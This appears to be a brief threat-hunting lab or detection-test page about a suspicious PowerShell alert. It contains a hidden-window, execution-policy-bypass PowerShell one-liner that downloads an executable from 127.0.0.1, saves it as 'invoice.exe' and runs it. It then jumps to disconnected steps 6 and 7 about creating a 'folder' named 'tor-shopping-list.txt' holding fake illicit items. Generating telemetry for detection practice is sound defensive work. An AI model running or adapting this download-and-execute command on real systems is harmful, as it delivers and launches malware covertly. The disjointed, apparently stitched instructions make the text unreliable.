# Suspicious PowerShell Activity Detected: Attempted Malicious File Download and Execution - Usage

## Overview:

This sequence is built to fetch a file from a network location and run it while reducing visibility and interrupting normal security signals. What this really means is the actor is trying to automate delivery and execution while making forensic and user detection harder.
```
powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference='silentlycontinue'; (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-WDATP-test\invoice.exe'); Start-Process 'C:\test-WDATP-test\invoice.exe'
```

6. Create a folder on your desktop called ```tor-shopping-list.txt``` and put a few fake (illicit) items in there
7. Delete the file.
